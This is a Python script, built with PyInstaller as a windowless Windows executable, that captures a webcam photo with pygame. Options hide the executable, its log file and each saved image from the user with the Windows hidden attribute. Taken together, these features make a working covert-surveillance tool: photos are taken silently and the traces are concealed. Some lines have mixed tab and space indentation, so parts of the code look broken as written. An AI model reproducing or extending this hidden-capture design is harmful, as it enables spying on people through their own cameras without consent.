"""
pyinstaller --onefile --hidden-import=pygame --hidden-import=ctypes --hidden-import=time --hidden-import=win32api --hidden-import=argparse --hidden-import=logging --hidden-import=win32con --hidden-import=os --hidden-import=datetime -w camera.py
"""

import pygame,ctypes,pygame.camera,time,win32api,argparse,win32con,os,datetime,logging
from pygame.locals import *

parser = argparse.ArgumentParser(description='A simple python camera shooter')
parser.add_argument("camera", help="Number of device (0)",type=int)
parser.add_argument("resX", help="Resolution X",type=int)
parser.add_argument("resY", help="Resolution Y",type=int)
parser.add_argument("-v", "--verbose", help="Log file",action="store_true")
parser.add_argument("-i", "--hidden", help="Hidden script",action="store_true")
parser.add_argument("-lc", "--listcameras", help="List of avaiable cameras",action="store_true")
parser.add_argument("-p", "--takephoto", help="Take photo",action="store_true")
args = parser.parse_args()

if args.verbose:
	LOG_FILENAME = "camera.log"
	logging.basicConfig(filename=LOG_FILENAME,level=logging.DEBUG)
	try:
   		win32api.SetFileAttributes(LOG_FILENAME,win32con.FILE_ATTRIBUTE_HIDDEN)
   	except Exception as e:
   		logging.exception("HIDE EXCEPTION")
	logging.debug("Setting log file hidden ... Done !")

if args.hidden:
    try:
    	win32api.SetFileAttributes("camera.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
    	logging.exception("HIDE EXCEPTION")
    logging.debug("Setting script file hidden ... Done !")

if args.listcameras:
	pygame.init()
	pygame.camera.init()
	try:
		cameras= pygame.camera.list_cameras()
		logging.debug(cameras)
	except Exception as e:
		logging.exception("LIST CAMERA EXCEPTION")

if args.takephoto:
	now = datetime.datetime.now()
	camera_device=args.camera
	resX=args.resX
	resY=args.resY
	logging.debug("Camera address: %d", camera_device)
	logging.debug("Resolution X: %d", resX)
	logging.debug("Resolution Y: %d", resY)
	logging.debug("")
	pygame.init()
	pygame.camera.init()
	size = (resX,resY)
	try:
		s = pygame.surface.Surface(size,0)
		cam = pygame.camera.Camera(camera_device,size)
		cam.start()
		logging.debug("Starting camera ... Done !")
		s = cam.get_image(s)
		logging.debug("Getting image ... Done !")
		hour = str(now.hour)
		minute = str(now.minute)
		second = str(now.second)
		p=("outimage_"+hour+"_"+minute+"_"+second+".jpg")
		pygame.image.save(s,p)
		self_path = os.path.abspath(p)
	except Exception as e:
		logging.exception("TAKE PHOTO EXCEPTION")
	logging.debug("Save image ... Done !")
	try:
		win32api.SetFileAttributes(self_path,win32con.FILE_ATTRIBUTE_HIDDEN)
		logging.debug("Setting output file hidden ... Done !")
	except Exception as e:
		logging.exception("HIDE EXCEPTION") 
	logging.debug("Close script ... Done !")
